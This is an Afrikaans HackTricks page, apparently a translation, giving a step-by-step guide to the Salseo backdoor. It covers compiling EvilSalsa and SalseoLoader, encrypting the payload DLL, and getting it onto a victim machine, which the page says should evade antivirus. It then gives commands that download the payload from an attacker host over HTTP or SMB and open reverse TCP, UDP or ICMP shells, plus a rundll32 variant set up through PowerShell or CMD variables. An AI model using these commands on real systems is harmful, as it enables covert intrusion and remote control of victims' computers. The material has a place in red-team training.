# Salseo

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Kompilering van die bineêre lêers

Laai die bronkode van die github af en kompileer **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode te kompileer.

Kompileer daardie projekte vir die argitektuur van die Windows-boks waar jy hulle gaan gebruik (As die Windows x64 ondersteun, kompileer hulle vir daardie argitekture).

Jy kan die argitektuur **kies binne Visual Studio in die linker "Bou" Tab** in **"Platform Target".**

(\*\*As jy hierdie opsies nie kan vind nie, druk in **"Projek Tab"** en dan in **"\<Projek Naam> Eienskappe"**)

![](<../.gitbook/assets/image (836).png>)

Bou dan beide projekte (Bou -> Bou Oplossing) (Binne die logs sal die pad van die uitvoerbare lêer verskyn):

![](<../.gitbook/assets/image (378).png>)

## Berei die Agterdeur voor

Eerstens, sal jy die **EvilSalsa.dll** moet kodeer. Om dit te doen, kan jy die python-skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** kompileer:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, nou het jy alles wat jy nodig het om al die Salseo-ding uit te voer: die **gekodeerde EvilDalsa.dll** en die **binêre van SalseoLoader.**

**Laai die SalseoLoader.exe binêre na die masjien op. Dit behoort nie deur enige AV opgespoor te word nie...**

## **Voer die agterdeur uit**

### **Kry 'n TCP-omgekeerde dop (laai die gekodeerde dll af deur HTTP)**

Onthou om 'n nc as die omgekeerde dopluisteraar te begin en 'n HTTP-bediener om die gekodeerde evilsalsa te dien.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Kry 'n UDP omgekeerde dop (afgelaaide gekodeerde dll deur SMB)**

Onthou om 'n nc te begin as die omgekeerde dop luisteraar, en 'n SMB-bediener om die gekodeerde evilsalsa te dien (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kry 'n ICMP-omgekeerde dop (geënkripteerde dll reeds binne die slagoffer)**

**Hierdie keer het jy 'n spesiale instrument in die klient nodig om die omgekeerde dop te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktiveer ICMP-antwoorde:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Voer die kliënt uit:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Binne die slagoffer, laat ons die salseo ding uitvoer:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilering van SalseoLoader as DLL wat die hooffunksie uitvoer

Maak die SalseoLoader projek oop met behulp van Visual Studio.

### Voeg voor die hooffunksie by: \[DllExport]

![](<../.gitbook/assets/image (405).png>)

### Installeer DllExport vir hierdie projek

#### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet-pakkette vir Oplossing...**

![](<../.gitbook/assets/image (878).png>)

#### **Soek na DllExport-pakket (deur die Blaai-tab te gebruik), en druk op Installeer (en aanvaar die popup)**

![](<../.gitbook/assets/image (97).png>)

In jou projekmap het die lêers verskyn: **DllExport.bat** en **DllExport\_Configure.bat**

### **Deïnstalleer DllExport**

Druk **Deïnstalleer** (ja, dit is vreemd, maar vertrou my, dit is nodig)

![](<../.gitbook/assets/image (94).png>)

### **Sluit Visual Studio af en voer DllExport\_configure uit**

Net **sluit** Visual Studio af

Gaan dan na jou **SalseoLoader map** en **voer DllExport\_Configure.bat uit**

Kies **x64** (as jy dit binne 'n x64-boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Naamruimte vir DllExport**) en druk **Toepas**

![](<../.gitbook/assets/image (879).png>)

### **Maak die projek weer oop met Visual Studio**

**\[DllExport]** behoort nie meer as fout gemerk te wees nie

![](<../.gitbook/assets/image (667).png>)

### Bou die oplossing

Kies **Uitvoertipe = Klasbiblioteek** (Projek --> SalseoLoader Eienskappe --> Toepassing --> Uitvoertipe = Klasbiblioteek)

![](<../.gitbook/assets/image (844).png>)

Kies **x64** **platform** (Projek --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)

![](<../.gitbook/assets/image (282).png>)

Om die oplossing te **bou**: Bou --> Bou Oplossing (Binne die Uitvoerkonsole sal die pad van die nuwe DLL verskyn)

### Toets die gegenereerde Dll

Kopieer en plak die Dll waar jy dit wil toets.

Voer uit:
```
rundll32.exe SalseoLoader.dll,main
```
Indien geen fout verskyn nie, het jy waarskynlik 'n funksionele DLL!!

## Kry 'n skaal deur die DLL te gebruik

Moenie vergeet om 'n **HTTP** **bediener** te gebruik en 'n **nc** **luisteraar** in te stel

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
